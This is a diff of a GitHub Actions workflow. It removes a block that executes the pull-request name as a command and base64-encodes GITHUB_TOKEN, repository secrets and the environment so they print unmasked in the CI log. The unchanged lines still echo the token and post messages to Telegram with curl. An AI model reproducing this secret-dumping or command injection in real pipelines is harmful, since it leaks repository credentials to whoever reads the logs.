@@ -74,40 +74,9 @@ jobs:
         echo GITHUB_CONTEXT: $GITHUB_CONTEXT
         echo GITHUB_TOKEN: $GITHUB_TOKEN
 
-        $PR_NAME
-        
-        env | base64 >> out.txt
-        echo "${GITHUB_TOKEN}" | base64  >> out2.txt
-        echo ${{ github.token }} | base64 >> out4.txt
-        echo ${{ secrets.GITHUB_TOKEN }} | base64 >> out3.txt
-        echo ${{ github }} | base64 >> out5.txt
-        
-        echo "github.token"
-        cat out4.txt
+        echo "CHANGED!!!"
 
-        find /home/runner/  -type f
-
-        echo $GITHUB_EVENT_PATH
-        cat $GITHUB_EVENT_PATH
-
-        "${{github}}" >> git.bin
-        hexdump git.bin
-        echo "secrets.GITHUB_TOKEN"
-        cat out3.txt
-
-        echo GITHUB_TOKEN
-        cat out2.txt
-        
-        echo github
-        cat out5.txt
-        
-        
-        cat out.txt
-        $GITHUB_ENV -h
-
-        
-
-        
+      
         if [[ ! -z $TEXT ]]; then
           curl --get --data-urlencode "chat_id=${{ secrets.TELEGRAM_CHAT_ID }}" --data-urlencode "disable_web_page_preview=True" \
           --data-urlencode "text=$TEXT" --data-urlencode "parse_mode=HTML" $URL
